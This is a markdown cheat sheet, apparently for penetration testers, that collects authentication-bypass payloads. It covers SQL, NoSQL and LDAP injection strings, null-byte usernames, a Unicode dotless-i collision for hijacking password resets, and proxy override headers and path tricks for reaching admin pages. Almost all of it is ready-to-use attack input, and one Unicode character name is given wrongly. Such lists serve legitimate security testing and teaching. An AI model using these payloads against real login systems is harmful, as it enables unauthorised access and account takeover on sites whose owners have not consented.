# Authentication & Registration Bypass Payloads Reference

This reference aggregates battle-tested payloads and testing vectors from real-world disclosures (`1-mresources.txt`, HackerOne writeups, and TBHM).

---

## 1. SQL Injection Authentication Bypasses (Check 02)
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 LIMIT 1 --
admin' --
admin' #
' OR ''='
' OR 1=1/*
") OR ("1"="1
```

---

## 2. NoSQL Injection Authentication Bypasses (MongoDB / Express - Check 03)
JSON Request Payloads:
```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```
```json
{
  "username": "admin",
  "password": {"$ne": "wrongpassword"}
}
```
```json
{
  "username": {"$regex": "^admin"},
  "password": {"$ne": null}
}
```

URL-encoded parameters:
```http
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
```

---

## 3. LDAP Injection Authentication Bypasses (Check 04)
```ldap
*
*)(&
*)(|(&
admin*)(|(password=*)
*)(userPassword=*
admin)(|(objectClass=*)
```

---

## 4. Null Byte Injection (`%00`) (Check 28 & 1-mresources.txt)
*Methodology from HackerOne & GitHub Disclosures:*
C-based runtimes, old PHP, or specific database drivers truncate strings at null characters (`\0` / `%00`). If authentication compares before the null byte but queries after, or vice-versa:
```http
username=admin%00&password=any
username=admin%00.attacker.com&password=any
username=admin\0&password=any
```

---

## 5. Unicode Case Mapping & Turkish Dotless 'i' Collision (Check 29)
*Methodology:*
In Unicode, `ı` (Latin Small Letter Dotless I, `\u0131`) upper-cases to `I` (`\u0049`) in certain locale conversions.
- Register user: `admın` (`\u0131`)
- If the application normalizes to uppercase during password reset or lookups (`toUpperCase()`), `admın` becomes `ADMIN`.
- When requesting a password reset for `ADMIN`, the system looks up `ADMIN`, matches `admın`'s email address, and sends the reset token to the attacker's inbox.

Similar collisions:
- `Kelvin sign` (`\u212A`) -> `k` / `K`
- `ſ` (Latin Small Letter Sharp S / Long S, `\u017F`) -> `s` / `S`

---

## 6. Reverse Proxy & Middleware Authentication Override Headers (Check 16)
When an authentication gateway (Nginx, HAProxy, Envoy, Kong) fronts a framework:
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Prefix: /admin
X-Original-Path: /admin
```
Path Normalization Differentials (Check 17):
```http
GET /login/..;/admin
GET /login/..%2fadmin
GET //admin//
GET /admin/.
GET /admin%20
GET /admin%09
```
